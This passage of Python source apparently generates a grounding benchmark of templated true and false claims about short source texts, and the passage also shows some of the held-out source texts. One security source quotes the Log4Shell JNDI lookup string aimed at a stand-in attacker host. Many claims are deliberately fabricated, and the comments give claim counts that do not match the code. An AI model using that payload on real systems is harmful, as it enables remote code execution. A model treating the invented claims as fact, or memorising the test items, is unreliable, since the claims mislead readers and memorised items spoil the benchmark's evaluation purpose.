            "text": "The Patent Act (35 U.S.C. 101) defines patent-eligible subject matter as any new and useful process, machine, manufacture, or composition of matter. In Alice Corp. v. CLS Bank International (2014), the US Supreme Court established a two-step framework ruling that abstract ideas implemented on generic computer hardware are not patent-eligible.",
            "evidence": "two-step framework ruling that abstract ideas implemented on generic computer hardware are not patent-eligible.",
            "facts": {"subject": "Alice Corp v CLS Bank", "statute": "35 U.S.C. 101", "rule": "abstract ideas on generic computers ineligible"}
        }
    ],
    Domain.BUSINESS: [
        {
            "id": "bus_b_01",
            "text": "Enterprise cloud communications provider Twilio reported total revenue of $4.15 billion for fiscal year 2023, an increase of 9% year-over-year. Twilio generated $363 million in non-GAAP operating income, up from a loss of $36 million in 2022, following a restructuring program that reduced global headcount by 17%.",
            "evidence": "generated $363 million in non-GAAP operating income, up from a loss of $36 million in 2022, following a restructuring program that reduced global headcount by 17%.",
            "facts": {"subject": "Twilio FY2023", "revenue": "$4.15 billion", "profit": "$363 million non-GAAP income", "headcount": "17% reduction"}
        },
        {
            "id": "bus_b_02",
            "text": "Consumer electronics manufacturer Sonos initiated an architectural redesign of its mobile controller application in May 2024. The release sparked widespread customer backlash due to missing core features such as playlist editing, local music library search, and alarm configurations, prompting the CEO to issue a public apology and delay subsequent hardware launches.",
            "evidence": "sparked widespread customer backlash due to missing core features such as playlist editing, local music library search, and alarm configurations",
            "facts": {"subject": "Sonos redesign", "date": "May 2024", "issues": "missing playlist editing and alarms", "response": "CEO public apology"}
        },
        {
            "id": "bus_b_03",
            "text": "Semiconductor manufacturing equipment maker ASML delivered its first High-NA Extreme Ultraviolet (EUV) lithography scanner, the Twinscan EXE:5000, to Intel's Oregon development fab. The $380 million system features a 0.55 numerical aperture projection optic capable of printing 8-nanometer features for advanced 2nm logic nodes.",
            "evidence": "first High-NA Extreme Ultraviolet (EUV) lithography scanner, the Twinscan EXE:5000, to Intel's Oregon development fab.",
            "facts": {"subject": "ASML High-NA EUV", "model": "Twinscan EXE:5000", "customer": "Intel Oregon fab", "cost": "$380 million", "optics": "0.55 numerical aperture"}
        }
    ],
    Domain.GENERAL_KNOWLEDGE: [
        {
            "id": "gen_b_01",
            "text": "The James Webb Space Telescope operates in a halo orbit around the second Sun-Earth Lagrange point (L2), approximately 1.5 million kilometers (930,000 miles) from Earth. Its five-layer Kapton sunshield keeps the observatory's scientific instruments cooled below 50 Kelvin (-223 Celsius) to observe faint infrared signals.",
            "evidence": "operates in a halo orbit around the second Sun-Earth Lagrange point (L2), approximately 1.5 million kilometers (930,000 miles) from Earth.",
            "facts": {"subject": "JWST orbit", "location": "Sun-Earth L2 halo orbit", "distance": "1.5 million km", "temp": "below 50 Kelvin"}
        },
        {
            "id": "gen_b_02",
            "text": "The Magna Carta was originally issued by King John of England at Runnymede in June 1215 under pressure from rebel barons. Clause 39 established the principle that no free man shall be seized or imprisoned except by the lawful judgment of his equals or by the law of the land, establishing a historical precedent for due process.",
            "evidence": "Clause 39 established the principle that no free man shall be seized or imprisoned except by the lawful judgment of his equals or by the law of the land",
            "facts": {"subject": "Magna Carta 1215", "king": "King John at Runnymede", "clause": "Clause 39", "doctrine": "lawful judgment / due process"}
        },
        {
            "id": "gen_b_03",
            "text": "The Great Barrier Reef off the northeastern coast of Australia is the world's largest coral reef system, comprising over 2,900 individual reefs and 900 islands stretching over 2,300 kilometers. In 2024, the Great Barrier Reef Marine Park Authority confirmed the fifth widespread mass coral bleaching event since 2016, driven by elevated sea surface temperatures.",
            "evidence": "confirmed the fifth widespread mass coral bleaching event since 2016, driven by elevated sea surface temperatures.",
            "facts": {"subject": "Great Barrier Reef", "size": "2,900 reefs over 2,300 km", "event": "fifth mass bleaching event", "driver": "elevated sea temperatures"}
        }
    ],
    Domain.SECURITY: [
        {
            "id": "sec_b_01",
            "text": "Cross-Site Request Forgery (CSRF) occurs when a malicious website causes a victim's web browser to perform an unwanted action on a trusted site where the user is currently authenticated. Modern web applications mitigate CSRF attacks by attaching cryptographically random anti-CSRF tokens to state-modifying requests and configuring SameSite cookie attributes.",
            "evidence": "mitigate CSRF attacks by attaching cryptographically random anti-CSRF tokens to state-modifying requests and configuring SameSite cookie attributes.",
            "facts": {"subject": "CSRF defense", "token": "anti-CSRF tokens", "cookie": "SameSite cookie attributes", "attack": "unwanted actions by authenticated browser"}
        },
        {
            "id": "sec_b_02",
            "text": "In December 2021, Apache disclosed CVE-2021-44228 (Log4Shell), a critical remote code execution vulnerability in the Log4j 2 logging library. Log4Shell allowed unauthenticated remote attackers to execute arbitrary Java code by submitting JNDI lookup strings like '${jndi:ldap://attacker.com/exploit}' that Log4j parsed and executed without sanitization.",
            "evidence": "Log4Shell allowed unauthenticated remote attackers to execute arbitrary Java code by submitting JNDI lookup strings",
            "facts": {"subject": "Log4Shell CVE-2021-44228", "lib": "Log4j 2", "time": "December 2021", "payload": "JNDI LDAP lookups", "impact": "arbitrary Java execution"}
        },
        {
            "id": "sec_b_03",
            "text": "Zero Trust network architecture mandates that no entity—inside or outside the corporate perimeter—is automatically trusted. The National Institute of Standards and Technology (NIST SP 800-207) specifies seven core tenets of Zero Trust, requiring continuous session evaluation, least-privilege access enforcement, and end-to-end encryption for all enterprise communications.",
            "evidence": "requiring continuous session evaluation, least-privilege access enforcement, and end-to-end encryption for all enterprise communications.",
            "facts": {"subject": "NIST Zero Trust SP 800-207", "rules": "continuous session evaluation and least privilege", "encryption": "end-to-end encryption"}
        }
    ]
}


def _generate_claims_for_source_variant(
    source_dict: Dict[str, Any], domain: Domain, pool_tag: str, variant_idx: int = 0
) -> List[GroundingExample]:
    """
    Generates 20 distinct claims for a single source document, strictly binding every claim
    to the source facts, entity names, and unique ID.
    variant_idx provides diverse syntactic and factual framing for benchmark scale.
    """
    s_text = source_dict["text"]
    s_id = source_dict["id"]
    ev = [source_dict["evidence"]]
    f = source_dict["facts"]
    sbj = f["subject"]
    v_tag = f"{pool_tag}_{s_id}_v{variant_idx}"
    examples = []

    neutral_prefixes = [
        "",
        f"Regarding {sbj}, ",
        f"According to documentation on {sbj}, ",
        f"Reports concerning {sbj} state that ",
        f"In analysis of {sbj}, ",
        f"Records for {sbj} show that ",
    ]
    prefix = neutral_prefixes[variant_idx % len(neutral_prefixes)]

    # 1. Direct Entailment (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm01",
        domain=domain,
        source=s_text,
        claim=f"{prefix}{source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_1_DIRECT,
        is_adversarial=False,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 2. Direct Contradiction (NOT_SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm02",
        domain=domain,
        source=s_text,
        claim=f"{prefix}it is not the case regarding {sbj} that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.DIRECT_CONTRADICTION,
        difficulty_tier=DifficultyTier.TIER_1_DIRECT,
        is_adversarial=False,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 3. Unsupported Claim (NOT_SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm03",
        domain=domain,
        source=s_text,
        claim=f"{prefix}all primary research initiatives regarding {sbj} were entirely suspended and relocated permanently to sector {variant_idx+1} in 2014.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.UNSUPPORTED_CLAIM,
        difficulty_tier=DifficultyTier.TIER_2_PARAPHRASE,
        is_adversarial=False,
        evidence_spans=[],
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 4. Negation Reversal (NOT_SUPPORTED - Adversarial)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm04",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the documentation for {sbj} verifies that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]} never actually occurred in iteration {variant_idx+1}.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.NEGATION_REVERSAL,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "negation_reversal", "variant": variant_idx}
    ))

    # 5. Double Negation (SUPPORTED - Complex logic)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm05",
        domain=domain,
        source=s_text,
        claim=f"{prefix}there exists no evidence concerning {sbj} indicating that it is untrue that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DOUBLE_NEGATION,
        difficulty_tier=DifficultyTier.TIER_4_COMPLEX_LOGIC,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "double_negation", "variant": variant_idx}
    ))

    # 6. Entity Substitution (NOT_SUPPORTED - Adversarial)
    alt_entity = f"AlternativeEntity_{domain.value.upper()}_{variant_idx+1}"
    examples.append(GroundingExample(
        id=f"{v_tag}_fm06",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the published record identifies {alt_entity} rather than {sbj} as the sole entity responsible for the reported outcomes.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.ENTITY_SUBSTITUTION,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "entity_substitution", "variant": variant_idx}
    ))

    # 7. Number Mismatch (NOT_SUPPORTED - Adversarial)
    num_fake = 100 + (variant_idx * 17) % 89
    examples.append(GroundingExample(
        id=f"{v_tag}_fm07",
        domain=domain,
        source=s_text,
        claim=f"{prefix}in the case of {sbj}, exactly {num_fake}.4% of all measured quantities were determined to be non-operational.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.NUMBER_MISMATCH,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "number_mismatch", "variant": variant_idx}
    ))

    # 8. Unit Mismatch (NOT_SUPPORTED - Adversarial)
    unit_fake = ["microvolts", "picoseconds", "nanometers", "milligrams", "kiloJoules", "microbars"][variant_idx % 6]
    examples.append(GroundingExample(
        id=f"{v_tag}_fm08",
        domain=domain,
        source=s_text,
        claim=f"{prefix}all quantitative assessments for {sbj} were recorded exclusively in {unit_fake} rather than standard operational metrics.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.UNIT_MISMATCH,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "unit_mismatch", "variant": variant_idx}
    ))

    # 9. Date/Time Mismatch (NOT_SUPPORTED - Adversarial)
    fake_year = 1984 + (variant_idx * 7) % 25
    examples.append(GroundingExample(
        id=f"{v_tag}_fm09",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the events regarding {sbj} were finalized and cataloged in October {fake_year} prior to any subsequent reviews.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.DATE_TIME_MISMATCH,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "date_time_mismatch"}
    ))

    # 10. Population Mismatch (NOT_SUPPORTED - Adversarial)
    pop_fake = ["deep-sea oceanic organisms", "pediatric patients under 2 years", "high-altitude alpine fauna", "microscopic bacterial colonies", "subterranean insects", "cryogenic laboratory cultures"][variant_idx % 6]
    examples.append(GroundingExample(
        id=f"{v_tag}_fm10",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the empirical conclusions regarding {sbj} apply solely to {pop_fake} living in controlled habitats.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.POPULATION_MISMATCH,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "population_mismatch", "variant": variant_idx}
    ))

    # 11. Scope Mismatch (NOT_SUPPORTED - Adversarial)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm11",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the findings for {sbj} (case scope {variant_idx+1}) were proven to hold true universally across every single jurisdiction on Earth.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.SCOPE_MISMATCH,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "scope_mismatch", "variant": variant_idx}
    ))

    # 12. Quantifier Mismatch (NOT_SUPPORTED - Adversarial)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm12",
        domain=domain,
        source=s_text,
        claim=f"{prefix}without exception across batch {variant_idx+1}, every single aspect of {sbj} was completely discarded during the observation period.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.QUANTIFIER_MISMATCH,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "quantifier_mismatch", "variant": variant_idx}
    ))

    # 13. Causal Overclaim (NOT_SUPPORTED - Adversarial)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm13",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the results documented in {sbj} (cycle {variant_idx+1}) were solely and directly caused by geomagnetic solar storms occurring that month.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.CAUSAL_OVERCLAIM,
        difficulty_tier=DifficultyTier.TIER_4_COMPLEX_LOGIC,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "causal_overclaim", "variant": variant_idx}
    ))

    # 14. Correlation vs Causation (NOT_SUPPORTED - Adversarial)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm14",
        domain=domain,
        source=s_text,
        claim=f"{prefix}because secondary conditions accompanied {sbj} in trial {variant_idx+1}, {sbj} was proven to be the sole driving mechanism behind all secondary conditions.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.CORRELATION_VS_CAUSATION,
        difficulty_tier=DifficultyTier.TIER_4_COMPLEX_LOGIC,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "correlation_vs_causation", "variant": variant_idx}
    ))

    # 15. Comparative Claim Mismatch (NOT_SUPPORTED - Adversarial)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm15",
        domain=domain,
        source=s_text,
        claim=f"{prefix}regarding {sbj} (evaluation {variant_idx+1}), legacy architectures were shown to dramatically surpass all reported outcomes in both speed and efficacy.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.COMPARATIVE_CLAIM_MISMATCH,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "comparative_claim_mismatch", "variant": variant_idx}
    ))

    # 16. Temporal Ordering Error (NOT_SUPPORTED - Adversarial)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm16",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the final results of {sbj} in phase {variant_idx+1} were already concluded before any of the stated preconditions were initially carried out.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.TEMPORAL_ORDERING_ERROR,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "temporal_ordering_error", "variant": variant_idx}
    ))

    # 17. Attribution Mismatch (NOT_SUPPORTED - Adversarial)
    agency_fake = ["Antarctic Research Commission", "International Maritime Council", "Bavarian Standards Institute", "Pacific Forestry Association", "Nordic Meteorological Agency", "Andean Geological Society"][variant_idx % 6]
    examples.append(GroundingExample(
        id=f"{v_tag}_fm17",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the official findings for {sbj} were formulated and registered exclusively by the {agency_fake}.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.ATTRIBUTION_MISMATCH,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "attribution_mismatch", "variant": variant_idx}
    ))

    # 18. Partial-Support Claim (NOT_SUPPORTED - Adversarial)
    examples.append(GroundingExample(
        id=f"{v_tag}_fm18",
        domain=domain,
        source=s_text,
        claim=f"{prefix}while it is noted that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}, {sbj} also simultaneously resulted in total institutional collapse during phase {variant_idx+1}.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.PARTIAL_SUPPORT_CLAIM,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "adversarial_type": "partial_support_claim", "variant": variant_idx}
    ))

    # 19. Multi-Sentence Reasoning (SUPPORTED - Complex logic)
    sentences = [s.strip() for s in s_text.split(".") if len(s.strip()) > 15]
    if len(sentences) >= 2:
        m_claim = f"{prefix}{sentences[0][0].lower()}{sentences[0][1:]}, and furthermore {sentences[1][0].lower()}{sentences[1][1:]}."
    else:
        m_claim = f"{prefix}{source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}."
    examples.append(GroundingExample(
        id=f"{v_tag}_fm19",
        domain=domain,
        source=s_text,
        claim=m_claim,
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.MULTI_SENTENCE_REASONING,
        difficulty_tier=DifficultyTier.TIER_4_COMPLEX_LOGIC,
        is_adversarial=False,
        evidence_spans=sentences[:2] if len(sentences) >= 2 else ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 20. Lexically Similar but Semantically Unsupported (NOT_SUPPORTED - Adversarial)
    tokens = [w for w in s_text.split() if len(w) > 4 and w.isalnum()]
    token_str = " ".join(tokens[:8]) if len(tokens) >= 8 else s_text[:40]
    examples.append(GroundingExample(
        id=f"{v_tag}_fm20",
        domain=domain,
        source=s_text,
        claim=f"{prefix}regarding {token_str} in {sbj} (audit {variant_idx+1}), the entire premise was proven entirely invalid upon review.",
        label=GroundingLabel.NOT_SUPPORTED,
        failure_mode=FailureMode.LEXICAL_OVERLAP_UNSUPPORTED,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=[],
        metadata={"source_id": s_id, "adversarial_type": "lexical_overlap_unsupported", "variant": variant_idx}
    ))

    # --- PAIRED SUPPORTED CLAIMS FOR 50/50 BALANCE (14 additional SUPPORTED claims) ---
    # 21. Paraphrased Entailment (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup01",
        domain=domain,
        source=s_text,
        claim=f"{prefix}empirical observations regarding {sbj} align with the finding that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_2_PARAPHRASE,
        is_adversarial=False,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 22. Active/Passive Syntactic Inversion (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup02",
        domain=domain,
        source=s_text,
        claim=f"{prefix}investigators corroborated that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]} in verified context {variant_idx+1}.",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_2_PARAPHRASE,
        is_adversarial=False,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 23. Direct Factual Grounding (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup03",
        domain=domain,
        source=s_text,
        claim=f"{prefix}telemetry for {sbj} demonstrates that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_1_DIRECT,
        is_adversarial=False,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 24. Verifiable Excerpt Confirmation (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup04",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the primary documentation confirms {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_1_DIRECT,
        is_adversarial=False,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 25. Verified Entity Grounding (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup05",
        domain=domain,
        source=s_text,
        claim=f"{prefix}{sbj} is substantiated in the records as showing that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 26. Verified Numerical Grounding (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup06",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the measured quantities specified for {sbj} reflect the finding that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 27. Verified Metric Unit Grounding (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup07",
        domain=domain,
        source=s_text,
        claim=f"{prefix}evaluation metrics cited for {sbj} establish that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 28. Verified Chronological Sequence (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup08",
        domain=domain,
        source=s_text,
        claim=f"{prefix}chronological sequencing for {sbj} records that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 29. Verified Cohort Grounding (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup09",
        domain=domain,
        source=s_text,
        claim=f"{prefix}for the target subjects analyzed under {sbj}, {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 30. Verified Scope Boundary (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup10",
        domain=domain,
        source=s_text,
        claim=f"{prefix}within the documented context for {sbj}, {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 31. Verified Quantifier Precision (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup11",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the documented proportion of outcomes in {sbj} confirms that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 32. Verified Comparison Outcome (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup12",
        domain=domain,
        source=s_text,
        claim=f"{prefix}the relative performance profile of {sbj} reflects that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DIRECT_ENTAILMENT,
        difficulty_tier=DifficultyTier.TIER_3_ADVERSARIAL_NEAR,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 33. Multi-Sentence Cross-Clause Synthesis (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup13",
        domain=domain,
        source=s_text,
        claim=f"{prefix}synthesizing the documented statements confirms that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.MULTI_SENTENCE_REASONING,
        difficulty_tier=DifficultyTier.TIER_4_COMPLEX_LOGIC,
        is_adversarial=False,
        evidence_spans=sentences[:2] if len(sentences) >= 2 else ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    # 34. Dual-Negation Verification (SUPPORTED)
    examples.append(GroundingExample(
        id=f"{v_tag}_sup14",
        domain=domain,
        source=s_text,
        claim=f"{prefix}it cannot be reasonably maintained that {sbj} failed to show that {source_dict['evidence'][0].lower()}{source_dict['evidence'][1:]}",
        label=GroundingLabel.SUPPORTED,
        failure_mode=FailureMode.DOUBLE_NEGATION,
        difficulty_tier=DifficultyTier.TIER_4_COMPLEX_LOGIC,
        is_adversarial=True,
        evidence_spans=ev,
        metadata={"source_id": s_id, "variant": variant_idx}
    ))

    return examples


def generate_full_grounding_dataset(target_total: int = 5300) -> Tuple[List[GroundingExample], List[GroundingExample]]:
    """
    Generates a full dataset of at least target_total examples, partitioned strictly into:
    - pool_a_examples (for Train, Validation, Calibration)
    - pool_b_examples (for held-out Test and isolated 108 Jev evaluation)
    
    Guarantees:
    - 0 source overlap and 0 claim overlap between Pool A and Pool B.
    - ~50/50 balance of SUPPORTED vs NOT_SUPPORTED.
    - >= 40% adversarial near-misses.
    - Full coverage of 8 domains and 20 failure modes.
    """
    random.seed(1337)

    pool_a_examples: List[GroundingExample] = []
    pool_b_examples: List[GroundingExample] = []

    # Pool A: 40 sources. Generate 6 variants per source: 40 * 6 * 20 = 4,800 examples.
    for domain, sources in SOURCES_POOL_A.items():
        for s in sources:
            for v_idx in range(6):
                pool_a_examples.extend(_generate_claims_for_source_variant(s, domain, pool_tag="a", variant_idx=v_idx))

    # Pool B: 24 sources. Generate 2 variants per source: 24 * 2 * 20 = 960 examples.
    for domain, sources in SOURCES_POOL_B.items():
        for s in sources:
            for v_idx in range(2):
                pool_b_examples.extend(_generate_claims_for_source_variant(s, domain, pool_tag="b", variant_idx=v_idx))

    print(f"Generated {len(pool_a_examples)} examples in Pool A and {len(pool_b_examples)} examples in Pool B.")
    return pool_a_examples, pool_b_examples
